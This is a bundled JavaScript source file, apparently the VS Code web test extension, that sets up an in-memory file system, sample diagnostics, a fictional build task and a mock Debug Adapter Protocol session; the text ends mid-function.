(function(e, a) { for(var i in a) e[i] = a[i]; }(exports, /******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, { enumerable: true, get: getter });
/******/ 		}
/******/ 	};
/******/
/******/ 	// define __esModule on exports
/******/ 	__webpack_require__.r = function(exports) {
/******/ 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 		}
/******/ 		Object.defineProperty(exports, '__esModule', { value: true });
/******/ 	};
/******/
/******/ 	// create a fake namespace object
/******/ 	// mode & 1: value is a module id, require it
/******/ 	// mode & 2: merge all properties of value into the ns
/******/ 	// mode & 4: return value when already ns object
/******/ 	// mode & 8|1: behave like require
/******/ 	__webpack_require__.t = function(value, mode) {
/******/ 		if(mode & 1) value = __webpack_require__(value);
/******/ 		if(mode & 8) return value;
/******/ 		if((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;
/******/ 		var ns = Object.create(null);
/******/ 		__webpack_require__.r(ns);
/******/ 		Object.defineProperty(ns, 'default', { enumerable: true, value: value });
/******/ 		if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
/******/ 		return ns;
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 0);
/******/ })
/************************************************************************/
/******/ ([
/* 0 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";

/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/
Object.defineProperty(exports, "__esModule", { value: true });
exports.MockRuntime = exports.MockDebugSession = exports.MockDebugAdapterDescriptorFactory = exports.Handles = exports.DebugSession = exports.ErrorDestination = exports.CapabilitiesEvent = exports.LoadedSourceEvent = exports.ModuleEvent = exports.BreakpointEvent = exports.ThreadEvent = exports.OutputEvent = exports.TerminatedEvent = exports.InitializedEvent = exports.ContinuedEvent = exports.StoppedEvent = exports.CompletionItem = exports.Module = exports.Breakpoint = exports.Variable = exports.Thread = exports.StackFrame = exports.Scope = exports.Source = exports.ProtocolServer = exports.Event = exports.Response = exports.Message = exports.activate = void 0;
//
// ############################################################################
//
//						! USED FOR RUNNING VSCODE OUT OF SOURCES FOR WEB !
//										! DO NOT REMOVE !
//
// ############################################################################
//
const vscode = __webpack_require__(1);
const memfs_1 = __webpack_require__(2);
function activate(context) {
    var _a;
    if (typeof window !== 'undefined') { // do not run under node.js
        const memFs = enableFs(context);
        if ((_a = vscode.workspace.workspaceFolders) === null || _a === void 0 ? void 0 : _a.some(f => f.uri.scheme === memfs_1.MemFS.scheme)) {
            memFs.seed();
            enableProblems(context);
            enableTasks();
            enableDebug(context, memFs);
            vscode.commands.executeCommand('vscode.open', vscode.Uri.parse(`memfs:/sample-folder/large.ts`));
        }
    }
}
exports.activate = activate;
function enableFs(context) {
    const memFs = new memfs_1.MemFS();
    context.subscriptions.push(memFs);
    return memFs;
}
function enableProblems(context) {
    const collection = vscode.languages.createDiagnosticCollection('test');
    if (vscode.window.activeTextEditor) {
        updateDiagnostics(vscode.window.activeTextEditor.document, collection);
    }
    context.subscriptions.push(vscode.window.onDidChangeActiveTextEditor(editor => {
        if (editor) {
            updateDiagnostics(editor.document, collection);
        }
    }));
}
function updateDiagnostics(document, collection) {
    if (document && document.fileName === '/sample-folder/large.ts') {
        collection.set(document.uri, [{
                code: '',
                message: 'cannot assign twice to immutable variable `storeHouses`',
                range: new vscode.Range(new vscode.Position(4, 12), new vscode.Position(4, 32)),
                severity: vscode.DiagnosticSeverity.Error,
                source: '',
                relatedInformation: [
                    new vscode.DiagnosticRelatedInformation(new vscode.Location(document.uri, new vscode.Range(new vscode.Position(1, 8), new vscode.Position(1, 9))), 'first assignment to `x`')
                ]
            }, {
                code: '',
                message: 'function does not follow naming conventions',
                range: new vscode.Range(new vscode.Position(7, 10), new vscode.Position(7, 23)),
                severity: vscode.DiagnosticSeverity.Warning,
                source: ''
            }]);
    }
    else {
        collection.clear();
    }
}
function enableTasks() {
    class CustomBuildTaskProvider {
        constructor(workspaceRoot) {
            this.workspaceRoot = workspaceRoot;
        }
        async provideTasks() {
            return this.getTasks();
        }
        resolveTask(_task) {
            const flavor = _task.definition.flavor;
            if (flavor) {
                const definition = _task.definition;
                return this.getTask(definition.flavor, definition.flags ? definition.flags : [], definition);
            }
            return undefined;
        }
        getTasks() {
            if (this.tasks !== undefined) {
                return this.tasks;
            }
            // In our fictional build, we have two build flavors
            const flavors = ['32', '64'];
            // Each flavor can have some options.
            const flags = [['watch', 'incremental'], ['incremental'], []];
            this.tasks = [];
            flavors.forEach(flavor => {
                flags.forEach(flagGroup => {
                    this.tasks.push(this.getTask(flavor, flagGroup));
                });
            });
            return this.tasks;
        }
        getTask(flavor, flags, definition) {
            if (definition === undefined) {
                definition = {
                    type: CustomBuildTaskProvider.CustomBuildScriptType,
                    flavor,
                    flags
                };
            }
            return new vscode.Task2(definition, vscode.TaskScope.Workspace, `${flavor} ${flags.join(' ')}`, CustomBuildTaskProvider.CustomBuildScriptType, new vscode.CustomExecution(async () => {
                // When the task is executed, this callback will run. Here, we setup for running the task.
                return new CustomBuildTaskTerminal(this.workspaceRoot, flavor, flags, () => this.sharedState, (state) => this.sharedState = state);
            }));
        }
    }
    CustomBuildTaskProvider.CustomBuildScriptType = 'custombuildscript';
    class CustomBuildTaskTerminal {
        constructor(workspaceRoot, _flavor, flags, getSharedState, setSharedState) {
            this.workspaceRoot = workspaceRoot;
            this.flags = flags;
            this.getSharedState = getSharedState;
            this.setSharedState = setSharedState;
            this.writeEmitter = new vscode.EventEmitter();
            this.onDidWrite = this.writeEmitter.event;
            this.closeEmitter = new vscode.EventEmitter();
            this.onDidClose = this.closeEmitter.event;
        }
        open(_initialDimensions) {
            // At this point we can start using the terminal.
            if (this.flags.indexOf('watch') > -1) {
                let pattern = this.workspaceRoot + '/customBuildFile';
                this.fileWatcher = vscode.workspace.createFileSystemWatcher(pattern);
                this.fileWatcher.onDidChange(() => this.doBuild());
                this.fileWatcher.onDidCreate(() => this.doBuild());
                this.fileWatcher.onDidDelete(() => this.doBuild());
            }
            this.doBuild();
        }
        close() {
            // The terminal has been closed. Shutdown the build.
            if (this.fileWatcher) {
                this.fileWatcher.dispose();
            }
        }
        async doBuild() {
            return new Promise((resolve) => {
                this.writeEmitter.fire('Starting build...\r\n');
                let isIncremental = this.flags.indexOf('incremental') > -1;
                if (isIncremental) {
                    if (this.getSharedState()) {
                        this.writeEmitter.fire('Using last build results: ' + this.getSharedState() + '\r\n');
                    }
                    else {
                        isIncremental = false;
                        this.writeEmitter.fire('No result from last build. Doing full build.\r\n');
                    }
                }
                // Since we don't actually build anything in this example set a timeout instead.
                setTimeout(() => {
                    const date = new Date();
                    this.setSharedState(date.toTimeString() + ' ' + date.toDateString());
                    this.writeEmitter.fire('Build complete.\r\n\r\n');
                    if (this.flags.indexOf('watch') === -1) {
                        this.closeEmitter.fire();
                        resolve();
                    }
                }, isIncremental ? 1000 : 4000);
            });
        }
    }
    vscode.tasks.registerTaskProvider(CustomBuildTaskProvider.CustomBuildScriptType, new CustomBuildTaskProvider(vscode.workspace.rootPath));
}
//---------------------------------------------------------------------------
//								DEBUG
//---------------------------------------------------------------------------
function enableDebug(context, memFs) {
    context.subscriptions.push(vscode.debug.registerDebugConfigurationProvider('mock', new MockConfigurationProvider()));
    context.subscriptions.push(vscode.debug.registerDebugAdapterDescriptorFactory('mock', new MockDebugAdapterDescriptorFactory(memFs)));
}
//------------------------------------------------------------------------------------------------------------------------------
class Message {
    constructor(type) {
        this.seq = 0;
        this.type = type;
    }
}
exports.Message = Message;
class Response extends Message {
    constructor(request, message) {
        super('response');
        this.request_seq = request.seq;
        this.command = request.command;
        if (message) {
            this.success = false;
            this.message = message;
        }
        else {
            this.success = true;
        }
    }
}
exports.Response = Response;
class Event extends Message {
    constructor(event, body) {
        super('event');
        this.event = event;
        if (body) {
            this.body = body;
        }
    }
}
exports.Event = Event;
//--------------------------------------------------------------------------------------------------------------------------------
class ProtocolServer {
    constructor() {
        this.close = new vscode.EventEmitter();
        this.onClose = this.close.event;
        this.error = new vscode.EventEmitter();
        this.onError = this.error.event;
        this.sendMessage = new vscode.EventEmitter();
        this.onDidSendMessage = this.sendMessage.event;
        this._sequence = 1;
        this._pendingRequests = new Map();
    }
    handleMessage(message) {
        this.dispatch(message);
    }
    dispose() {
    }
    sendEvent(event) {
        this._send('event', event);
    }
    sendResponse(response) {
        if (response.seq > 0) {
            console.error(`attempt to send more than one response for command ${response.command}`);
        }
        else {
            this._send('response', response);
        }
    }
    sendRequest(command, args, timeout, cb) {
        const request = {
            command: command
        };
        if (args && Object.keys(args).length > 0) {
            request.arguments = args;
        }
        this._send('request', request);
        if (cb) {
            this._pendingRequests.set(request.seq, cb);
            const timer = setTimeout(() => {
                clearTimeout(timer);
                const clb = this._pendingRequests.get(request.seq);
                if (clb) {
                    this._pendingRequests.delete(request.seq);
                    clb(new Response(request, 'timeout'));
                }
            }, timeout);
        }
    }
    // ---- protected ----------------------------------------------------------
    dispatchRequest(_request) {
    }
    // ---- private ------------------------------------------------------------
    dispatch(msg) {
        if (msg.type === 'request') {
            this.dispatchRequest(msg);
        }
        else if (msg.type === 'response') {
            const response = msg;
            const clb = this._pendingRequests.get(response.request_seq);
            if (clb) {
                this._pendingRequests.delete(response.request_seq);
                clb(response);
            }
        }
    }
    _send(typ, message) {
        message.type = typ;
        message.seq = this._sequence++;
        this.sendMessage.fire(message);
    }
}
exports.ProtocolServer = ProtocolServer;
//-------------------------------------------------------------------------------------------------------------------------------
class Source {
    constructor(name, path, id = 0, origin, data) {
        this.name = name;
        this.path = path;
        this.sourceReference = id;
        if (origin) {
            this.origin = origin;
        }
        if (data) {
            this.adapterData = data;
        }
    }
}
exports.Source = Source;
class Scope {
    constructor(name, reference, expensive = false) {
        this.name = name;
        this.variablesReference = reference;
        this.expensive = expensive;
    }
}
exports.Scope = Scope;
class StackFrame {
    constructor(i, nm, src, ln = 0, col = 0) {
        this.id = i;
        this.source = src;
        this.line = ln;
        this.column = col;
        this.name = nm;
    }
}
exports.StackFrame = StackFrame;
class Thread {
    constructor(id, name) {
        this.id = id;
        if (name) {
            this.name = name;
        }
        else {
            this.name = 'Thread #' + id;
        }
    }
}
exports.Thread = Thread;
class Variable {
    constructor(name, value, ref = 0, indexedVariables, namedVariables) {
        this.name = name;
        this.value = value;
        this.variablesReference = ref;
        if (typeof namedVariables === 'number') {
            this.namedVariables = namedVariables;
        }
        if (typeof indexedVariables === 'number') {
            this.indexedVariables = indexedVariables;
        }
    }
}
exports.Variable = Variable;
class Breakpoint {
    constructor(verified, line, column, source) {
        this.verified = verified;
        const e = this;
        if (typeof line === 'number') {
            e.line = line;
        }
        if (typeof column === 'number') {
            e.column = column;
        }
        if (source) {
            e.source = source;
        }
    }
}
exports.Breakpoint = Breakpoint;
class Module {
    constructor(id, name) {
        this.id = id;
        this.name = name;
    }
}
exports.Module = Module;
class CompletionItem {
    constructor(label, start, length = 0) {
        this.label = label;
        this.start = start;
        this.length = length;
    }
}
exports.CompletionItem = CompletionItem;
class StoppedEvent extends Event {
    constructor(reason, threadId, exceptionText) {
        super('stopped');
        this.body = {
            reason: reason
        };
        if (typeof threadId === 'number') {
            this.body.threadId = threadId;
        }
        if (typeof exceptionText === 'string') {
            this.body.text = exceptionText;
        }
    }
}
exports.StoppedEvent = StoppedEvent;
class ContinuedEvent extends Event {
    constructor(threadId, allThreadsContinued) {
        super('continued');
        this.body = {
            threadId: threadId
        };
        if (typeof allThreadsContinued === 'boolean') {
            this.body.allThreadsContinued = allThreadsContinued;
        }
    }
}
exports.ContinuedEvent = ContinuedEvent;
class InitializedEvent extends Event {
    constructor() {
        super('initialized');
    }
}
exports.InitializedEvent = InitializedEvent;
class TerminatedEvent extends Event {
    constructor(restart) {
        super('terminated');
        if (typeof restart === 'boolean' || restart) {
            const e = this;
            e.body = {
                restart: restart
            };
        }
    }
}
exports.TerminatedEvent = TerminatedEvent;
class OutputEvent extends Event {
    constructor(output, category = 'console', data) {
        super('output');
        this.body = {
            category: category,
            output: output
        };
        if (data !== undefined) {
            this.body.data = data;
        }
    }
}
exports.OutputEvent = OutputEvent;
class ThreadEvent extends Event {
    constructor(reason, threadId) {
        super('thread');
        this.body = {
            reason: reason,
            threadId: threadId
        };
    }
}
exports.ThreadEvent = ThreadEvent;
class BreakpointEvent extends Event {
    constructor(reason, breakpoint) {
        super('breakpoint');
        this.body = {
            reason: reason,
            breakpoint: breakpoint
        };
    }
}
exports.BreakpointEvent = BreakpointEvent;
class ModuleEvent extends Event {
    constructor(reason, module) {
        super('module');
        this.body = {
            reason: reason,
            module: module
        };
    }
}
exports.ModuleEvent = ModuleEvent;
class LoadedSourceEvent extends Event {
    constructor(reason, source) {
        super('loadedSource');
        this.body = {
            reason: reason,
            source: source
        };
    }
}
exports.LoadedSourceEvent = LoadedSourceEvent;
class CapabilitiesEvent extends Event {
    constructor(capabilities) {
        super('capabilities');
        this.body = {
            capabilities: capabilities
        };
    }
}
exports.CapabilitiesEvent = CapabilitiesEvent;
var ErrorDestination;
(function (ErrorDestination) {
    ErrorDestination[ErrorDestination["User"] = 1] = "User";
    ErrorDestination[ErrorDestination["Telemetry"] = 2] = "Telemetry";
})(ErrorDestination = exports.ErrorDestination || (exports.ErrorDestination = {}));
class DebugSession extends ProtocolServer {
    constructor(obsolete_debuggerLinesAndColumnsStartAt1, obsolete_isServer) {
        super();
        const linesAndColumnsStartAt1 = typeof obsolete_debuggerLinesAndColumnsStartAt1 === 'boolean' ? obsolete_debuggerLinesAndColumnsStartAt1 : false;
        this._debuggerLinesStartAt1 = linesAndColumnsStartAt1;
        this._debuggerColumnsStartAt1 = linesAndColumnsStartAt1;
        this._debuggerPathsAreURIs = false;
        this._clientLinesStartAt1 = true;
        this._clientColumnsStartAt1 = true;
        this._clientPathsAreURIs = false;
        this._isServer = typeof obsolete_isServer === 'boolean' ? obsolete_isServer : false;
        this.onClose(() => {
            this.shutdown();
        });
        this.onError((_error) => {
            this.shutdown();
        });
    }
    setDebuggerPathFormat(format) {
        this._debuggerPathsAreURIs = format !== 'path';
    }
    setDebuggerLinesStartAt1(enable) {
        this._debuggerLinesStartAt1 = enable;
    }
    setDebuggerColumnsStartAt1(enable) {
        this._debuggerColumnsStartAt1 = enable;
    }
    setRunAsServer(enable) {
        this._isServer = enable;
    }
    shutdown() {
        if (this._isServer) {
            // shutdown ignored in server mode
        }
        else {
            // TODO@AW
            /*
            // wait a bit before shutting down
            setTimeout(() => {
                process.exit(0);
            }, 100);
            */
        }
    }
    sendErrorResponse(response, codeOrMessage, format, variables, dest = ErrorDestination.User) {
        let msg;
        if (typeof codeOrMessage === 'number') {
            msg = {
                id: codeOrMessage,
                format: format
            };
            if (variables) {
                msg.variables = variables;
            }
            if (dest & ErrorDestination.User) {
                msg.showUser = true;
            }
            if (dest & ErrorDestination.Telemetry) {
                msg.sendTelemetry = true;
            }
        }
        else {
            msg = codeOrMessage;
        }
        response.success = false;
        response.message = DebugSession.formatPII(msg.format, true, msg.variables);
        if (!response.body) {
            response.body = {};
        }
        response.body.error = msg;
        this.sendResponse(response);
    }
    runInTerminalRequest(args, timeout, cb) {
        this.sendRequest('runInTerminal', args, timeout, cb);
    }
    dispatchRequest(request) {
        const response = new Response(request);
        try {
            if (request.command === 'initialize') {
                const args = request.arguments;
                if (typeof args.linesStartAt1 === 'boolean') {
                    this._clientLinesStartAt1 = args.linesStartAt1;
                }
                if (typeof args.columnsStartAt1 === 'boolean') {
                    this._clientColumnsStartAt1 = args.columnsStartAt1;
                }
                if (args.pathFormat !== 'path') {
                    this.sendErrorResponse(response, 2018, 'debug adapter only supports native paths', null, ErrorDestination.Telemetry);
                }
                else {
                    const initializeResponse = response;
                    initializeResponse.body = {};
                    this.initializeRequest(initializeResponse, args);
                }
            }
            else if (request.command === 'launch') {
                this.launchRequest(response, request.arguments, request);
            }
            else if (request.command === 'attach') {
                this.attachRequest(response, request.arguments, request);
            }
            else if (request.command === 'disconnect') {
                this.disconnectRequest(response, request.arguments, request);
            }
            else if (request.command === 'terminate') {
                this.terminateRequest(response, request.arguments, request);
            }
            else if (request.command === 'restart') {
                this.restartRequest(response, request.arguments, request);
            }
            else if (request.command === 'setBreakpoints') {
                this.setBreakPointsRequest(response, request.arguments, request);
            }
            else if (request.command === 'setFunctionBreakpoints') {
                this.setFunctionBreakPointsRequest(response, request.arguments, request);
            }
            else if (request.command === 'setExceptionBreakpoints') {
                this.setExceptionBreakPointsRequest(response, request.arguments, request);
            }
            else if (request.command === 'configurationDone') {
                this.configurationDoneRequest(response, request.arguments, request);
            }
            else if (request.command === 'continue') {
                this.continueRequest(response, request.arguments, request);
            }
            else if (request.command === 'next') {
                this.nextRequest(response, request.arguments, request);
            }
            else if (request.command === 'stepIn') {
                this.stepInRequest(response, request.arguments, request);
            }
            else if (request.command === 'stepOut') {
                this.stepOutRequest(response, request.arguments, request);
            }
            else if (request.command === 'stepBack') {
                this.stepBackRequest(response, request.arguments, request);
            }
            else if (request.command === 'reverseContinue') {
                this.reverseContinueRequest(response, request.arguments, request);
            }
            else if (request.command === 'restartFrame') {
                this.restartFrameRequest(response, request.arguments, request);
            }
            else if (request.command === 'goto') {
                this.gotoRequest(response, request.arguments, request);
            }
            else if (request.command === 'pause') {
                this.pauseRequest(response, request.arguments, request);
            }
            else if (request.command === 'stackTrace') {
                this.stackTraceRequest(response, request.arguments, request);
            }
            else if (request.command === 'scopes') {
                this.scopesRequest(response, request.arguments, request);
            }
            else if (request.command === 'variables') {
                this.variablesRequest(response, request.arguments, request);
            }
            else if (request.command === 'setVariable') {
                this.setVariableRequest(response, request.arguments, request);
            }
            else if (request.command === 'setExpression') {
                this.setExpressionRequest(response, request.arguments, request);
            }
            else if (request.command === 'source') {
                this.sourceRequest(response, request.arguments, request);
            }
            else if (request.command === 'threads') {
                this.threadsRequest(response, request);
            }
            else if (request.command === 'terminateThreads') {
                this.terminateThreadsRequest(response, request.arguments, request);
            }
            else if (request.command === 'evaluate') {
                this.evaluateRequest(response, request.arguments, request);
            }
            else if (request.command === 'stepInTargets') {
                this.stepInTargetsRequest(response, request.arguments, request);
            }
            else if (request.command === 'gotoTargets') {
                this.gotoTargetsRequest(response, request.arguments, request);
            }
            else if (request.command === 'completions') {
                this.completionsRequest(response, request.arguments, request);
            }
            else if (request.command === 'exceptionInfo') {
                this.exceptionInfoRequest(response, request.arguments, request);
            }
            else if (request.command === 'loadedSources') {
                this.loadedSourcesRequest(response, request.arguments, request);
            }
            else if (request.command === 'dataBreakpointInfo') {
                this.dataBreakpointInfoRequest(response, request.arguments, request);
            }
            else if (request.command === 'setDataBreakpoints') {
                this.setDataBreakpointsRequest(response, request.arguments, request);
            }
            else if (request.command === 'readMemory') {
                this.readMemoryRequest(response, request.arguments, request);
            }
            else if (request.command === 'disassemble') {
                this.disassembleRequest(response, request.arguments, request);
            }
            else if (request.command === 'cancel') {
                this.cancelRequest(response, request.arguments, request);
            }
            else if (request.command === 'breakpointLocations') {
                this.breakpointLocationsRequest(response, request.arguments, request);
            }
            else {
                this.customRequest(request.command, response, request.arguments, request);
            }
        }
        catch (e) {
            this.sendErrorResponse(response, 1104, '{_stack}', { _exception: e.message, _stack: e.stack }, ErrorDestination.Telemetry);
        }
    }
    initializeRequest(response, _args) {
        response.body = response.body || {};
        // This default debug adapter does not support conditional breakpoints.
        response.body.supportsConditionalBreakpoints = false;
        // This default debug adapter does not support hit conditional breakpoints.
        response.body.supportsHitConditionalBreakpoints = false;
        // This default debug adapter does not support function breakpoints.
        response.body.supportsFunctionBreakpoints = false;
        // This default debug adapter implements the 'configurationDone' request.
        response.body.supportsConfigurationDoneRequest = true;
        // This default debug adapter does not support hovers based on the 'evaluate' request.
        response.body.supportsEvaluateForHovers = false;
        // This default debug adapter does not support the 'stepBack' request.
        response.body.supportsStepBack = false;
        // This default debug adapter does not support the 'setVariable' request.
        response.body.supportsSetVariable = false;
        // This default debug adapter does not support the 'restartFrame' request.
        response.body.supportsRestartFrame = false;
        // This default debug adapter does not support the 'stepInTargets' request.
        response.body.supportsStepInTargetsRequest = false;
        // This default debug adapter does not support the 'gotoTargets' request.
        response.body.supportsGotoTargetsRequest = false;
        // This default debug adapter does not support the 'completions' request.
        response.body.supportsCompletionsRequest = false;
        // This default debug adapter does not support the 'restart' request.
        response.body.supportsRestartRequest = false;
        // This default debug adapter does not support the 'exceptionOptions' attribute on the 'setExceptionBreakpoints' request.
        response.body.supportsExceptionOptions = false;
        // This default debug adapter does not support the 'format' attribute on the 'variables', 'evaluate', and 'stackTrace' request.
        response.body.supportsValueFormattingOptions = false;
        // This debug adapter does not support the 'exceptionInfo' request.
        response.body.supportsExceptionInfoRequest = false;
        // This debug adapter does not support the 'TerminateDebuggee' attribute on the 'disconnect' request.
        response.body.supportTerminateDebuggee = false;
        // This debug adapter does not support delayed loading of stack frames.
        response.body.supportsDelayedStackTraceLoading = false;
        // This debug adapter does not support the 'loadedSources' request.
        response.body.supportsLoadedSourcesRequest = false;
        // This debug adapter does not support the 'logMessage' attribute of the SourceBreakpoint.
        response.body.supportsLogPoints = false;
        // This debug adapter does not support the 'terminateThreads' request.
        response.body.supportsTerminateThreadsRequest = false;
        // This debug adapter does not support the 'setExpression' request.
        response.body.supportsSetExpression = false;
        // This debug adapter does not support the 'terminate' request.
        response.body.supportsTerminateRequest = false;
        // This debug adapter does not support data breakpoints.
        response.body.supportsDataBreakpoints = false;
        /** This debug adapter does not support the 'readMemory' request. */
        response.body.supportsReadMemoryRequest = false;
        /** The debug adapter does not support the 'disassemble' request. */
        response.body.supportsDisassembleRequest = false;
        /** The debug adapter does not support the 'cancel' request. */
        response.body.supportsCancelRequest = false;
        /** The debug adapter does not support the 'breakpointLocations' request. */
        response.body.supportsBreakpointLocationsRequest = false;
        this.sendResponse(response);
    }
    disconnectRequest(response, _args, _request) {
        this.sendResponse(response);
        this.shutdown();
    }
    launchRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    attachRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    terminateRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    restartRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    setBreakPointsRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    setFunctionBreakPointsRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    setExceptionBreakPointsRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    configurationDoneRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    continueRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    nextRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    stepInRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    stepOutRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    stepBackRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    reverseContinueRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    restartFrameRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    gotoRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    pauseRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    sourceRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    threadsRequest(response, _request) {
        this.sendResponse(response);
    }
    terminateThreadsRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    stackTraceRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    scopesRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    variablesRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    setVariableRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    setExpressionRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    evaluateRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    stepInTargetsRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    gotoTargetsRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    completionsRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    exceptionInfoRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    loadedSourcesRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    dataBreakpointInfoRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    setDataBreakpointsRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    readMemoryRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    disassembleRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    cancelRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    breakpointLocationsRequest(response, _args, _request) {
        this.sendResponse(response);
    }
    /**
     * Override this hook to implement custom requests.
     */
    customRequest(_command, response, _args, _request) {
        this.sendErrorResponse(response, 1014, 'unrecognized request', null, ErrorDestination.Telemetry);
    }
    //---- protected -------------------------------------------------------------------------------------------------
    convertClientLineToDebugger(line) {
        if (this._debuggerLinesStartAt1) {
            return this._clientLinesStartAt1 ? line : line + 1;
        }
        return this._clientLinesStartAt1 ? line - 1 : line;
    }
    convertDebuggerLineToClient(line) {
        if (this._debuggerLinesStartAt1) {
            return this._clientLinesStartAt1 ? line : line - 1;
        }
        return this._clientLinesStartAt1 ? line + 1 : line;
    }
    convertClientColumnToDebugger(column) {
        if (this._debuggerColumnsStartAt1) {
            return this._clientColumnsStartAt1 ? column : column + 1;
        }
        return this._clientColumnsStartAt1 ? column - 1 : column;
    }
    convertDebuggerColumnToClient(column) {
        if (this._debuggerColumnsStartAt1) {
            return this._clientColumnsStartAt1 ? column : column - 1;
        }
        return this._clientColumnsStartAt1 ? column + 1 : column;
    }
    convertClientPathToDebugger(clientPath) {
        if (this._clientPathsAreURIs !== this._debuggerPathsAreURIs) {
            if (this._clientPathsAreURIs) {
                return DebugSession.uri2path(clientPath);
            }
            else {
                return DebugSession.path2uri(clientPath);
            }
        }
        return clientPath;
    }
    convertDebuggerPathToClient(debuggerPath) {
        if (this._debuggerPathsAreURIs !== this._clientPathsAreURIs) {
            if (this._debuggerPathsAreURIs) {
                return DebugSession.uri2path(debuggerPath);
            }
            else {
                return DebugSession.path2uri(debuggerPath);
            }
        }
        return debuggerPath;
    }
    //---- private -------------------------------------------------------------------------------
    static path2uri(path) {
        path = encodeURI(path);
        let uri = new URL(`file:`); // ignore 'path' for now
        uri.pathname = path; // now use 'path' to get the correct percent encoding (see https://url.spec.whatwg.org)
        return uri.toString();
    }
    static uri2path(sourceUri) {
        let uri = new URL(sourceUri);
        let s = decodeURIComponent(uri.pathname);
        return s;
    }
    /*
    * If argument starts with '_' it is OK to send its value to telemetry.
    */
    static formatPII(format, excludePII, args) {
        return format.replace(DebugSession._formatPIIRegexp, function (match, paramName) {
            if (excludePII && paramName.length > 0 && paramName[0] !== '_') {
                return match;
            }
            return args && args[paramName] && args.hasOwnProperty(paramName) ?
                args[paramName] :
                match;
        });
    }
}
exports.DebugSession = DebugSession;
DebugSession._formatPIIRegexp = /{([^}]+)}/g;
//---------------------------------------------------------------------------
class Handles {
    constructor(startHandle) {
        this.START_HANDLE = 1000;
        this._handleMap = new Map();
        this._nextHandle = typeof startHandle === 'number' ? startHandle : this.START_HANDLE;
    }
    reset() {
        this._nextHandle = this.START_HANDLE;
        this._handleMap = new Map();
    }
    create(value) {
        const handle = this._nextHandle++;
        this._handleMap.set(handle, value);
        return handle;
    }
    get(handle, dflt) {
        return this._handleMap.get(handle) || dflt;
    }
}
exports.Handles = Handles;
//---------------------------------------------------------------------------
class MockConfigurationProvider {
    /**
     * Massage a debug configuration just before a debug session is being launched,
     * e.g. add all missing attributes to the debug configuration.
     */
    resolveDebugConfiguration(_folder, config, _token) {
        // if launch.json is missing or empty
        if (!config.type && !config.request && !config.name) {
            const editor = vscode.window.activeTextEditor;
            if (editor && editor.document.languageId === 'markdown') {
                config.type = 'mock';
                config.name = 'Launch';
                config.request = 'launch';
                config.program = '${file}';
                config.stopOnEntry = true;
            }
        }
        if (!config.program) {
